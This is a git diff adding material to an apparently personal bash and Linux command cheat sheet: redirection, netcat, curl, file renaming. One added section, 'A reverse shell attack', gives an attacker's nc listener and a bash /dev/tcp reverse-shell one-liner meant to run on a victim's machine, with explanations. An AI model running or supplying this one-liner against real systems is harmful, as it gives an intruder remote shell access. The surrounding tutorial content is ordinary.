@@ -10,6 +10,9 @@
 - `./`: Current Directory
 - `*`: Wildcard (Matches any character or group of characters)
 - `*`: can also mean all the files and folders of current directory
+- `<` or `0`: standard input
+- `>` or `1`: standard output
+- `&` or `2`: standard error
 
 ### Example Path:
 
@@ -34,6 +37,17 @@ myfiles=(\*)
 echo "$myfiles"
 echo "{myfiles[0]}"
 echo "${myfiles[0]}"
+
+#both stdout and stderr of the echo command are redirected to a file named output.txt. If there's an error, it will also be captured in the file.
+echo "Hello, world!" >& output.txt
+
+#This one-liner discards both stdout and stderr by redirecting them to /dev/null. It's useful when you want to suppress output.
+command_that_might_produce_output >& /dev/null
+
+#List the contents of the current directory, and if there are any errors,include them in the output,then display everything using cat.
+#2>&1 means "redirect standard error to the same location as standard output."
+#By default, when you run a command, stdout and stderr are separate. 2>&1 is used to merge them, so both regular output and error messages are directed to the same place.
+ls 2>&1 | cat
 
 #see the user name
 whoami
@@ -60,7 +74,7 @@ ls */*txt
 stat abc.txt
 
 #In string format, %U represents the username of the file owner.
-stat --format "%U"
+stat --format "%U" abc.txt
 
 #This would display a custom format with file name, size, owner, and group information.
 stat --format "File: %n Size: %s bytes Owner: %U Group: %G" abc.txt
@@ -649,25 +663,71 @@ sudo ifdown <logical_name_of_interface>
 
 ## 1. Basic Usage - Listening on a Port
 
-- `l`: Listen mode, for inbound connections.
-- `p` 1234: Specifies the port to listen on (replace 1234 with your desired port).
-- `v`: verbose mode, i.e., Display more information about the connection.
-
 ```bash
+#Basic Chat application:
+#- `l`: Listen mode, for inbound connections.
+#- `p` 1234: Specifies the port to listen on (replace 1234 with your desired port).
+#- `v`: verbose mode, i.e., Display more information about the connection.
+#server(localhost) is listening at 1234
 nc -lvp 1234
+#Client from another tab connects to the loacthost server at 1234
+nc localhost 1234
 ```
 
 ## 2. Basic Usage - Connecting to a Host and Port
 
 ```bash
-#Connects to the host at IP address 10.0.2.5 on port 1234.
+#Connects from CLIENT to the host at IP address 10.0.2.5 on port 1234.
 nc 10.0.2.5 1234
 
 #Listens on port 1234 and saves the received data to a file named received_file.txt.
 nc -l -p 1234 > received_file.txt
-
 #Connects to the host at IP address 10.0.2.5 on port 1234 and sends the contents of file_to_send.txt.
 nc 10.0.2.5 1234 < file_to_send.txt
+```
+
+## 3. A reverse shell attack
+
+```bash
+#Say attacker is listening at 1234
+nc -lvp 1234
+
+#the following one-liner has to executed from the victim's machine
+#it could be done if the victim is running any unpatched version software that can execute shell command
+bash -i >& /dev/tcp/[attacker IP]/[attacker port] 0>&1
+#bash -i: This starts an interactive Bash shell.
+#>&: This is a redirection operator that combines the standard output (stdout) and standard error (stderr).
+#/dev/tcp/[attacker IP]/[attacker port]: This part is using Bash's built-in functionality to create a TCP connection to the specified IP address and port. It essentially connects the shell to a remote machine.
+#0>&1: This redirects the input (stdin) to the combined stdout and stderr, completing the connection.
+```
+
+# The mighty curl!
+
+```bash
+#This command downloads a file from the specified URL (https://example.com/file.txt) and saves it with the same name locally.
+curl -O https://example.com/file.txt
+
+#The --progress-bar option displays a progress bar during the download.
+curl -O https://example.com/largefile.zip --progress-bar
+
+#Sending Data with a POST Request:This sends a POST request to the specified URL (https://example.com/api) with the specified data.
+curl -X POST -d "param1=value1&param2=value2" https://example.com/api
+
+#Sending JSON Data in a POST Request:This example sends a POST request with JSON data to an API.
+curl -X POST -H "Content-Type: application/json" -d '{"key": "value"}' https://example.com/api
+
+#Uploading a File:This uploads a local file (localfile.txt) to an FTP server.
+curl -T localfile.txt ftp://ftp.example.com/upload/
+
+# Authenticating with Basic Auth:
+curl -u username:password https://example.com/api
+
+#Displaying HTTP Headers:The -I option fetches the headers only, without downloading the body content.
+curl -I https://yeaseen.github.io
+
+#This command is effectively saying: "Download the file from the specified URL (https://example.com), follow any redirects (-L), and save it locally with the same name as the remote file (-O). Additionally, download the entire content of the file (-r with no specified range).
+curl -O -L -r https://example.com
+
 ```
 
 # Scanning a network with netstat and nmap:
@@ -723,7 +783,7 @@ unzip archive.zip
 unzip archive.zip -d /path/to/destination/
 ```
 
-### Special Commands
+# Special Commands
 
 ```bash
 #Show system and kernel
@@ -761,4 +821,7 @@ sudo poweroff
 
 logout
 
+#bash one-liner
+#Renames all files with the .jpg extension by adding a prefix.
+for file in *.jpg; do mv "$file" "newprefix_$file"; done
 ```
